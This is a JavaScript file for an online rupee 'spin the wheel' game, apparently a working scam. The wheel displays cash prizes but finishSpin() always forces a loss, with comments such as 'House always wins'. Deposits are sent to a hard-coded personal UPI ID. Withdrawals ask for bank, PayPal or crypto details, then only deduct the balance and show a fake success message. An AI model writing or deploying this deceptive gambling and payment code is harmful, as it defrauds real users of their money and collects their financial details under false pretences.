// Simple Spin The Wheel Game - Always lands on "Try Again"
class SpinTheWheelGame {
    constructor() {
        this.canvas = document.getElementById('wheelCanvas');
        this.ctx = this.canvas.getContext('2d');
        this.spinSound = document.getElementById('spinSound');
        this.winSound = document.getElementById('winSound');
        
        // Show prize amounts but only land on 0 segments
        this.prizes = [0, 500, 700, 0, 1000, 200, 0, 600, 0, 800]; // Actual prizes (0 = Try Again)
        this.displayPrizes = [0, 500, 700, 0, 1000, 200, 0, 600, 0, 800]; // What to show visually
        this.colors = [
            '#FF4444', '#4ECDC4', '#96CEB4', '#FF4444', '#9B59B6',
            '#F39C12', '#FF4444', '#3498DB', '#FF4444', '#E74C3C'
        ];
        
        this.spinCost = 10.00;
        this.isSpinning = false;
        this.currentRotation = 0;
        this.numSegments = this.prizes.length;
        this.anglePerSegment = (2 * Math.PI) / this.numSegments;
        
        // Game stats
        this.gameStats = this.loadGameStats();
        
        // Initialize
        this.init();
    }
    
    init() {
        this.updateBalance();
        this.updateStats();
        this.drawWheel();
        this.setupEventListeners();
    }
    
    setupEventListeners() {
        document.getElementById('spinBtn').addEventListener('click', () => {
            if (!this.isSpinning) {
                this.spinWheel();
            }
        });
        
        document.getElementById('withdrawMethod').addEventListener('change', (e) => {
            const detailsDiv = document.getElementById('withdrawDetails');
            const accountInput = document.getElementById('accountDetails');
            
            if (e.target.value) {
                detailsDiv.style.display = 'block';
                switch(e.target.value) {
                    case 'bank':
                        accountInput.placeholder = 'Bank account number';
                        break;
                    case 'paypal':
                        accountInput.placeholder = 'PayPal email address';
                        break;
                    case 'crypto':
                        accountInput.placeholder = 'Crypto wallet address';
                        break;
                }
            } else {
                detailsDiv.style.display = 'none';
            }
        });
    }
    
    // Wallet functions
    getBalance() {
        return parseFloat(localStorage.getItem('gameBalance')) || 0;
    }
    
    setBalance(amount) {
        localStorage.setItem('gameBalance', amount.toFixed(2));
        this.updateBalance();
    }
    
    updateBalance() {
        const balance = this.getBalance();
        document.getElementById('balance').textContent = balance.toFixed(2);
        document.getElementById('withdrawBalance').textContent = balance.toFixed(2);
        
        const spinBtn = document.getElementById('spinBtn');
        if (balance < this.spinCost) {
            spinBtn.disabled = true;
            spinBtn.textContent = '💰 Need More Funds';
        } else {
            spinBtn.disabled = false;
            spinBtn.textContent = '🎯 SPIN TO WIN!';
        }
    }
    
    // Stats functions
    loadGameStats() {
        const defaultStats = { totalSpins: 0, totalWon: 0, biggestWin: 0 };
        const saved = localStorage.getItem('gameStats');
        return saved ? JSON.parse(saved) : defaultStats;
    }
    
    saveGameStats() {
        localStorage.setItem('gameStats', JSON.stringify(this.gameStats));
    }
    
    updateStats() {
        document.getElementById('totalSpins').textContent = this.gameStats.totalSpins;
        document.getElementById('totalWon').textContent = '₹' + this.gameStats.totalWon.toFixed(2);
        document.getElementById('biggestWin').textContent = '₹' + this.gameStats.biggestWin.toFixed(2);
    }
    
    // Draw the wheel
    drawWheel() {
        const centerX = 200;
        const centerY = 200;
        const radius = 180;
        
        this.ctx.clearRect(0, 0, 400, 400);
        
        // Draw segments
        for (let i = 0; i < this.numSegments; i++) {
            const startAngle = this.currentRotation + (i * this.anglePerSegment);
            const endAngle = startAngle + this.anglePerSegment;
            
            // Draw segment
            this.ctx.beginPath();
            this.ctx.moveTo(centerX, centerY);
            this.ctx.arc(centerX, centerY, radius, startAngle, endAngle);
            this.ctx.closePath();
            this.ctx.fillStyle = this.colors[i];
            this.ctx.fill();
            this.ctx.strokeStyle = '#ffffff';
            this.ctx.lineWidth = 2;
            this.ctx.stroke();
            
            // Draw text
            this.ctx.save();
            this.ctx.translate(centerX, centerY);
            this.ctx.rotate(startAngle + this.anglePerSegment / 2);
            this.ctx.fillStyle = '#000000';
            this.ctx.font = 'bold 14px Arial';
            this.ctx.textAlign = 'center';
            
            const text = this.displayPrizes[i] === 0 ? 'Try Again' : '₹' + this.displayPrizes[i];
            this.ctx.fillText(text, radius * 0.65, 5);
            
            this.ctx.restore();
        }
        
        // Center circle
        this.ctx.beginPath();
        this.ctx.arc(centerX, centerY, 25, 0, 2 * Math.PI);
        this.ctx.fillStyle = '#FFD700';
        this.ctx.fill();
        this.ctx.strokeStyle = '#000000';
        this.ctx.lineWidth = 2;
        this.ctx.stroke();
    }
    
    // Main spin function - RESULT ALWAYS 0
    spinWheel() {
        const balance = this.getBalance();
        
        if (balance < this.spinCost) {
            this.showResult('❌ Insufficient funds! Please add money to continue.', 'error');
            return;
        }
        
        if (this.isSpinning) return;
        
        // Deduct cost - house always keeps this money
        this.setBalance(balance - this.spinCost);
        this.isSpinning = true;
        
        // Add spinning animation to pointer
        const pointer = document.querySelector('.pointer');
        if (pointer) {
            pointer.classList.add('spinning');
        }
        
        // Play sound
        this.spinSound.currentTime = 0;
        this.spinSound.play().catch(() => {});
        
        // Pick ANY random segment - doesn't matter since result is always 0
        const targetSegment = Math.floor(Math.random() * this.numSegments);
        
        // Fast spinning animation - 8-12 rotations
        const extraRotations = 8 + Math.random() * 4;
        const baseRotation = extraRotations * 2 * Math.PI;
        const targetRotation = this.currentRotation + baseRotation;
        
        // Animate to target
        this.animateToTarget(targetRotation);
        
        // Update stats
        this.gameStats.totalSpins++;
        this.saveGameStats();
        this.updateStats();
        
        // NOTE: Result will ALWAYS be 0 in finishSpin() regardless of where it lands
    }
    
    animateToTarget(targetRotation) {
        const startRotation = this.currentRotation;
        const totalRotation = targetRotation - startRotation;
        const duration = 2000; // Faster - 2 seconds instead of 3
        const startTime = Date.now();
        
        const animate = () => {
            const elapsed = Date.now() - startTime;
            const progress = Math.min(elapsed / duration, 1);
            
            // Much faster easing - more aggressive curve
            const easeOut = 1 - Math.pow(1 - progress, 2);
            
            this.currentRotation = startRotation + (totalRotation * easeOut);
            this.drawWheel();
            
            if (progress < 1) {
                requestAnimationFrame(animate);
            } else {
                this.finishSpin();
            }
        };
        
        animate();
    }
    
    finishSpin() {
        this.isSpinning = false;
        this.spinSound.pause();
        
        // Remove spinning animation from pointer
        const pointer = document.querySelector('.pointer');
        if (pointer) {
            pointer.classList.remove('spinning');
        }
        
        // FORCE RESULT TO ALWAYS BE 0 - NO MATTER WHERE IT LANDS
        // Even if it visually lands on a prize segment, always give 0
        
        console.log(`Spin complete - FORCED RESULT: Try Again (0) - House always wins!`);
        
        // ALWAYS show "Try Again" - 100% guaranteed loss
        this.showResult('😔 Better luck next time! Try again!', 'lose');
        
        // Never add any money to balance - house keeps the ₹50 spin cost
    }
    
    showResult(message, type) {
        const resultDiv = document.getElementById('result');
        resultDiv.textContent = message;
        resultDiv.className = 'result-display ' + type;
        
        setTimeout(() => {
            resultDiv.className = 'result-display';
        }, 3000);
    }
}

// Payment System
class PaymentSystem {
    constructor() {
        this.selectedPayment = null;
        this.selectedAmount = null;
    }
    
    selectPayment(method) {
        this.selectedPayment = method;
        
        document.querySelectorAll('.payment-btn').forEach(btn => {
            btn.classList.remove('selected');
        });
        event.target.classList.add('selected');
        
        this.showPaymentForm(method);
    }
    
    selectAmount(amount) {
        this.selectedAmount = amount;
        
        document.querySelectorAll('.amount-btn').forEach(btn => {
            btn.classList.remove('selected');
        });
        event.target.classList.add('selected');
        
        document.getElementById('customAmount').value = '';
    }
    
    showPaymentForm(method) {
        const formDiv = document.getElementById('paymentForm');
        const titleDiv = document.getElementById('paymentTitle');
        const fieldsDiv = document.getElementById('paymentFields');
        
        let title = '';
        let fields = '';
        
        switch(method) {
            case 'upi':
                title = '📱 UPI Payment';
                fields = `
                    <div class="form-group">
                        <label>UPI ID to Pay</label>
                        <input type="text" id="upiId" value="9326195985@ibl" readonly style="background: #f0f0f0; color: #333; font-weight: bold; text-align: center;">
                    </div>
                    <div class="form-group">
                        <label>Amount to Pay</label>
                        <input type="text" id="upiAmount" placeholder="Select amount first" readonly>
                    </div>
                    <div class="upi-info">
                        <p><strong>Pay to:</strong> 9326195985@ibl</p>
                        <p><strong>Instructions:</strong></p>
                        <ol>
                            <li>Open your UPI app (Paytm, GPay, PhonePe, etc.)</li>
                            <li>Send money to: <strong>9326195985@ibl</strong></li>
                            <li>Enter the amount shown above</li>
                            <li>Complete the payment</li>
                            <li>Click confirm below</li>
                        </ol>
                    </div>
                `;
                break;
                
            case 'qr':
                title = '📷 QR Code Payment';
                fields = `
                    <div class="qr-payment" style="text-align: center;">
                        <div class="qr-code" style="margin-bottom: 20px;">
                            <img src="qr-code.png" alt="Payment QR Code" style="width: 250px; height: 250px; border: 2px solid #ddd; margin: 0 auto; display: block; border-radius: 10px;">
                        </div>
                        <div class="qr-info">
                            <p><strong>Amount to Pay:</strong> ₹<span id="qrAmount">0</span></p>
                            <p><strong>UPI ID:</strong> 9326195985@ibl</p>
                            <p><strong>Instructions:</strong></p>
                            <ol style="text-align: left; max-width: 300px; margin: 0 auto;">
                                <li>Open any UPI app on your phone</li>
                                <li>Scan the QR code above</li>
                                <li>Verify the amount matches: ₹<span class="qr-amount-check">0</span></li>
                                <li>Complete the payment to 9326195985@ibl</li>
                                <li>Click "Payment Done" below</li>
                            </ol>
                        </div>
                    </div>
                    <div class="form-group">
                        <label>Transaction ID (Optional)</label>
                        <input type="text" id="transactionId" placeholder="Enter transaction ID from your UPI app">
                    </div>
                `;
                break;
        }
        
        titleDiv.textContent = title;
        fieldsDiv.innerHTML = fields;
        formDiv.style.display = 'block';
        
        // Set the amount in the form
        const customAmount = document.getElementById('customAmount').value;
        const amount = customAmount ? parseFloat(customAmount) : this.selectedAmount;
        
        if (method === 'upi' && amount) {
            setTimeout(() => {
                const upiAmountField = document.getElementById('upiAmount');
                if (upiAmountField) {
                    upiAmountField.value = '₹' + amount.toFixed(2);
                }
            }, 100);
        }
        
        if (method === 'qr' && amount) {
            setTimeout(() => {
                const qrAmountSpan = document.getElementById('qrAmount');
                if (qrAmountSpan) {
                    qrAmountSpan.textContent = amount.toFixed(2);
                }
                
                const qrAmountCheck = document.querySelector('.qr-amount-check');
                if (qrAmountCheck) {
                    qrAmountCheck.textContent = amount.toFixed(2);
                }
            }, 100);
        }
    }
    
    setupCardFormatting() {
        document.getElementById('cardNumber').addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });
        
        document.getElementById('cardExpiry').addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        document.getElementById('cardCvv').addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
    
    processDeposit() {
        const customAmount = document.getElementById('customAmount').value;
        const amount = customAmount ? parseFloat(customAmount) : this.selectedAmount;
        
        if (!this.selectedPayment) {
            alert('Please select a payment method');
            return;
        }
        
        if (!amount || amount < 10) {
            alert('Please select or enter an amount (minimum ₹10)');
            return;
        }
        
        if (!this.validatePaymentDetails()) {
            return;
        }
        
        this.showLoading();
        
        // Create payment request
        const paymentRequest = {
            userId: this.generateUserId(),
            amount: amount,
            method: this.selectedPayment === 'upi' ? 'UPI ID' : 'QR Code',
            upiId: this.selectedPayment === 'upi' ? document.getElementById('upiId')?.value : '9326195985@ibl',
            transactionId: document.getElementById('transactionId')?.value || null,
            timestamp: new Date().toISOString(),
            status: 'pending'
        };
        
        // Store user ID for this session
        localStorage.setItem('currentUserId', paymentRequest.userId);
        
        // Add to pending payments queue
        const pendingPayments = JSON.parse(localStorage.getItem('pendingPayments')) || [];
        pendingPayments.push(paymentRequest);
        localStorage.setItem('pendingPayments', JSON.stringify(pendingPayments));
        
        setTimeout(() => {
            this.hideLoading();
            
            // Show processing message and keep it visible
            this.showProcessingStatus(amount);
            
            hideDepositModal();
            this.resetForm();
            
            // Start checking for approval
            this.checkForApproval(paymentRequest.userId);
        }, 2000);
    }
    
    showProcessingStatus(amount) {
        // Create or update processing status display
        let statusDiv = document.getElementById('processingStatus');
        if (!statusDiv) {
            statusDiv = document.createElement('div');
            statusDiv.id = 'processingStatus';
            statusDiv.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: linear-gradient(45deg, #f39c12, #e67e22);
                color: white;
                padding: 15px 20px;
                border-radius: 10px;
                box-shadow: 0 4px 15px rgba(243,156,18,0.4);
                z-index: 1000;
                font-weight: bold;
                animation: pulse 2s infinite;
                max-width: 300px;
            `;
            document.body.appendChild(statusDiv);
            
            // Add pulse animation
            const style = document.createElement('style');
            style.textContent = `
                @keyframes pulse {
                    0%, 100% { transform: scale(1); }
                    50% { transform: scale(1.05); }
                }
            `;
            document.head.appendChild(style);
        }
        
        statusDiv.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="width: 20px; height: 20px; border: 2px solid white; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
                <div>
                    <div style="font-size: 14px;">Processing Payment</div>
                    <div style="font-size: 12px; opacity: 0.9;">₹${amount.toFixed(2)} - Waiting for confirmation</div>
                </div>
            </div>
        `;
        
        // Add spin animation for loading spinner
        if (!document.getElementById('spinAnimation')) {
            const spinStyle = document.createElement('style');
            spinStyle.id = 'spinAnimation';
            spinStyle.textContent = `
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `;
            document.head.appendChild(spinStyle);
        }
    }
    
    hideProcessingStatus() {
        const statusDiv = document.getElementById('processingStatus');
        if (statusDiv) {
            statusDiv.remove();
        }
    }
    
    generateUserId() {
        // Generate a simple user ID (you can make this more sophisticated)
        return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
    }
    
    checkForApproval(userId) {
        // Check every 3 seconds if payment was approved
        const checkInterval = setInterval(() => {
            const approvedFunds = JSON.parse(localStorage.getItem('approvedFunds')) || {};
            const rejectedPayments = JSON.parse(localStorage.getItem('rejectedPayments')) || [];
            
            if (approvedFunds[userId]) {
                // Payment was approved! Add funds to balance
                const currentBalance = game.getBalance();
                const approvedAmount = approvedFunds[userId];
                game.setBalance(currentBalance + approvedAmount);
                
                // Remove from approved funds
                delete approvedFunds[userId];
                localStorage.setItem('approvedFunds', JSON.stringify(approvedFunds));
                
                // Hide processing status
                this.hideProcessingStatus();
                
                // Show success message
                game.showResult(`🎉 Payment Approved! ₹${approvedAmount.toFixed(2)} added to your account!`, 'win');
                
                clearInterval(checkInterval);
            } else if (rejectedPayments.includes(userId)) {
                // Payment was rejected
                const rejectedList = rejectedPayments.filter(id => id !== userId);
                localStorage.setItem('rejectedPayments', JSON.stringify(rejectedList));
                
                // Hide processing status
                this.hideProcessingStatus();
                
                // Show rejection message
                game.showResult(`❌ Payment Rejected. Please try again or contact support.`, 'lose');
                
                clearInterval(checkInterval);
            }
        }, 3000); // Check every 3 seconds
        
        // Stop checking after 15 minutes
        setTimeout(() => {
            clearInterval(checkInterval);
            // If still processing after 15 minutes, show timeout message
            const statusDiv = document.getElementById('processingStatus');
            if (statusDiv) {
                this.hideProcessingStatus();
                game.showResult(`⏰ Payment processing timeout. Please contact admin if payment was made.`, 'lose');
            }
        }, 900000); // 15 minutes
    }
    
    validatePaymentDetails() {
        switch(this.selectedPayment) {
            case 'upi':
                // UPI payment doesn't need validation since we show the UPI ID
                return true;
                
            case 'qr':
                // QR code payment doesn't need validation
                // Transaction ID is optional
                return true;
        }
        
        return true;
    }
    
    processWithdrawal() {
        const amount = parseFloat(document.getElementById('withdrawAmount').value);
        const method = document.getElementById('withdrawMethod').value;
        const accountDetails = document.getElementById('accountDetails').value;
        const currentBalance = game.getBalance();
        
        if (!amount || amount < 200) {
            alert('Minimum withdrawal amount is ₹200');
            return;
        }
        
        if (amount > currentBalance) {
            alert('Insufficient balance for withdrawal');
            return;
        }
        
        if (!method) {
            alert('Please select a withdrawal method');
            return;
        }
        
        if (!accountDetails.trim()) {
            alert('Please enter your account details');
            return;
        }
        
        this.showLoading();
        
        setTimeout(() => {
            this.hideLoading();
            
            game.setBalance(currentBalance - amount);
            
            game.showResult(`✅ Withdrawal request of ₹${amount.toFixed(2)} submitted successfully!`, 'win');
            
            hideWithdrawModal();
            
            document.getElementById('withdrawAmount').value = '';
            document.getElementById('withdrawMethod').value = '';
            document.getElementById('accountDetails').value = '';
            document.getElementById('withdrawDetails').style.display = 'none';
        }, 2000);
    }
    
    showLoading() {
        document.getElementById('loadingOverlay').style.display = 'flex';
    }
    
    hideLoading() {
        document.getElementById('loadingOverlay').style.display = 'none';
    }
    
    resetForm() {
        this.selectedPayment = null;
        this.selectedAmount = null;
        
        document.querySelectorAll('.payment-btn, .amount-btn').forEach(btn => {
            btn.classList.remove('selected');
        });
        
        document.getElementById('paymentForm').style.display = 'none';
        document.getElementById('customAmount').value = '';
    }
}

// Global instances
let game;
let paymentSystem;

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
    // Check if user is logged in
    const currentUser = localStorage.getItem('currentGameUser');
    if (!currentUser) {
        // Redirect to login if not logged in
        window.location.href = 'login.html';
        return;
    }
    
    // Load user data
    const users = JSON.parse(localStorage.getItem('gameUsers')) || {};
    const userData = users[currentUser];
    
    if (!userData) {
        // User data not found, redirect to login
        localStorage.removeItem('currentGameUser');
        window.location.href = 'login.html';
        return;
    }
    
    // Set user's balance from their account
    if (userData.balance !== undefined) {
        localStorage.setItem('gameBalance', userData.balance.toString());
    }
    
    // Initialize game
    game = new SpinTheWheelGame();
    paymentSystem = new PaymentSystem();
    
    // Add logout functionality
    addLogoutButton();
    
    // Show welcome message
    showWelcomeMessage(currentUser, userData);
});

// Add logout button to the page
function addLogoutButton() {
    const header = document.querySelector('header');
    if (header) {
        const logoutBtn = document.createElement('button');
        logoutBtn.innerHTML = '🚪 Logout';
        logoutBtn.style.cssText = `
            position: absolute;
            top: 20px;
            right: 20px;
            background: linear-gradient(45deg, #E74C3C, #C0392B);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        `;
        logoutBtn.onclick = logout;
        header.appendChild(logoutBtn);
    }
}

// Logout function
function logout() {
    if (confirm('Are you sure you want to logout?')) {
        // Save current balance to user account
        const currentUser = localStorage.getItem('currentGameUser');
        const users = JSON.parse(localStorage.getItem('gameUsers')) || {};
        
        if (users[currentUser]) {
            users[currentUser].balance = parseFloat(localStorage.getItem('gameBalance')) || 0;
            localStorage.setItem('gameUsers', JSON.stringify(users));
        }
        
        // Clear session
        localStorage.removeItem('currentGameUser');
        localStorage.removeItem('gameBalance');
        
        // Redirect to login
        window.location.href = 'login.html';
    }
}

// Show welcome message
function showWelcomeMessage(username, userData) {
    setTimeout(() => {
        const welcomeDiv = document.createElement('div');
        welcomeDiv.style.cssText = `
            position: fixed;
            top: 80px;
            right: 20px;
            background: linear-gradient(45deg, #27AE60, #2ECC71);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(39,174,96,0.4);
            z-index: 1000;
            font-weight: bold;
            animation: slideIn 0.5s ease;
            max-width: 300px;
        `;
        
        let message = `Welcome back, ${username}! 🎉`;
        
        welcomeDiv.innerHTML = message;
        document.body.appendChild(welcomeDiv);
        
        // Add slide in animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
        `;
        document.head.appendChild(style);
        
        // Remove after 3 seconds
        setTimeout(() => {
            welcomeDiv.remove();
        }, 3000);
    }, 500);
}

// Global functions for HTML onclick events
function spinWheel() {
    if (game && !game.isSpinning) {
        game.spinWheel();
    }
}

function showDepositModal() {
    document.getElementById('depositModal').style.display = 'block';
}

function hideDepositModal() {
    document.getElementById('depositModal').style.display = 'none';
    paymentSystem.resetForm();
}

function showWithdrawModal() {
    document.getElementById('withdrawModal').style.display = 'block';
    document.getElementById('withdrawBalance').textContent = game.getBalance().toFixed(2);
}

function hideWithdrawModal() {
    document.getElementById('withdrawModal').style.display = 'none';
}

function selectPayment(method) {
    paymentSystem.selectPayment(method);
    
    // Update payment details after form is shown
    setTimeout(() => {
        if (method === 'upi') {
            // Update UPI ID in the form
            const upiElements = document.querySelectorAll('strong');
            upiElements.forEach(el => {
                if (el.textContent.includes('spinwheel@paytm')) {
                    el.textContent = '9326195985@ibl';
                }
            });
            
            // Update UPI ID input field
            const upiInput = document.getElementById('upiId');
            if (upiInput) {
                upiInput.value = '9326195985@ibl';
                upiInput.style.background = '#f0f0f0';
                upiInput.style.color = '#333';
                upiInput.style.fontWeight = 'bold';
                upiInput.style.textAlign = 'center';
                upiInput.readOnly = true;
            }
            
            // Set amount if already selected
            const selectedAmount = paymentSystem.selectedAmount;
            const customAmount = document.getElementById('customAmount').value;
            const amount = customAmount ? parseFloat(customAmount) : selectedAmount;
            
            if (amount) {
                const upiAmountField = document.getElementById('upiAmount');
                if (upiAmountField) {
                    upiAmountField.value = '₹' + amount.toFixed(2);
                }
            }
        }
        
        if (method === 'qr') {
            // Set amount if already selected
            const selectedAmount = paymentSystem.selectedAmount;
            const customAmount = document.getElementById('customAmount').value;
            const amount = customAmount ? parseFloat(customAmount) : selectedAmount;
            
            if (amount) {
                const qrAmountSpan = document.getElementById('qrAmount');
                if (qrAmountSpan) {
                    qrAmountSpan.textContent = amount.toFixed(2);
                }
                
                // Also update the amount check in instructions
                const qrAmountCheck = document.querySelector('.qr-amount-check');
                if (qrAmountCheck) {
                    qrAmountCheck.textContent = amount.toFixed(2);
                }
            }
        }
    }, 200);
}

function selectAmount(amount) {
    paymentSystem.selectAmount(amount);
    
    // Update amounts in payment forms immediately
    setTimeout(() => {
        // Update UPI amount
        const upiAmount = document.getElementById('upiAmount');
        if (upiAmount) {
            upiAmount.value = '₹' + amount.toFixed(2);
        }
        
        // Update QR amount
        const qrAmount = document.getElementById('qrAmount');
        if (qrAmount) {
            qrAmount.textContent = amount.toFixed(2);
        }
    }, 100);
}

function processDeposit() {
    paymentSystem.processDeposit();
}

function processWithdrawal() {
    paymentSystem.processWithdrawal();
}

// Close modals when clicking outside
window.addEventListener('click', (e) => {
    const depositModal = document.getElementById('depositModal');
    const withdrawModal = document.getElementById('withdrawModal');
    
    if (e.target === depositModal) {
        hideDepositModal();
    }
    if (e.target === withdrawModal) {
        hideWithdrawModal();
    }
});